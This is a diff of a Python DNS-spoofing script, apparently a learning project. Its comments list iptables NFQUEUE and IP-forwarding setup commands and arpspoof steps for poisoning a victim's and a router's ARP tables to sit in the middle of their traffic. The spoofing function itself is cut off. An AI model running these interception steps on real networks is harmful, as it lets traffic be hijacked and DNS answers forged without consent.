@@ -1,31 +1,32 @@
 # create a queue to trap the responses when the machine act as man in the middle
 # iptables -I FORWARD -j NFQUEUE --queue-num 1
-# sudo iptables -D FORWARD
-# from python I can interact with the created queue
-
-# apt-get update
-# apt-get -y install libnetfilter-queue-dev
-# sudo pip3 install --upgrade -U  git+https://github.com/kti/python-netfilterqueue
-# pip install netfilterqueue
-
-# sudo sysctl -w net.ipv4.ip_forward=1
-# sudo sysctl -w net.ipv4.ip_forward=0
-# sudo "echo 1 > /proc/sys/net/ipv4/ip_forward"
-# sudo "echo 0 > /proc/sys/net/ipv4/ip_forward"
-
-# sudo iptables --flush
 
 # as a test on local pc I redirect the INPUT and OUTPUT chain instead of the FORWARD
 # iptables -I OUTPUT -j NFQUEUE --queue-num 1
 # iptables -I INPUT -j NFQUEUE --queue-num 1
 
+# restore routing
+# sudo iptables -D FORWARD
+# sudo iptables --flush
+
+# from python I can interact with the created queue
+# apt-get update
+# apt-get -y install libnetfilter-queue-dev
+# sudo pip3 install --upgrade -U  git+https://github.com/kti/python-netfilterqueue
+# pip install netfilterqueue
+
+# for a local test activate the local webserver
 # sudo service apache2 start
+
+# to change the DNS response you have to act as man in the middle
+# use your own arp spoofing program or a tool available in kali
+# two times because you have to poisoning both victim and router arp table
+# arpspoof - [network interface] -t[Victim IP][Router IP]
+# arpspoof - [network interface] -t[Router IP] [Victim IP]
+
 
 from netfilterqueue import NetfilterQueue
 import scapy.all as scapy
-
-
-# import netfilterqueue
 
 
 def process_packet(packet):
